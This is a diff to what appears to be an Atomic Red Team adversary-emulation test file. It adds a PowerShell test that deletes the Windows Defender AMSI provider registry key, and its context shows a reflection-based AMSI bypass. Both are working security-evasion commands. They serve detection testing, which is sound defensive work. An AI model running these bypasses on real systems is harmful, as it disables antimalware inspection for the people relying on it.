@@ -165,3 +165,19 @@ atomic_tests:
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     cleanup_command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+
+- name: AMSI Bypass - Remove AMSI Provider Reg Key
+  description: |
+    With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+    This test removes the Windows Defender provider registry key. 
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+       Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+    cleanup_command: |
+       New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
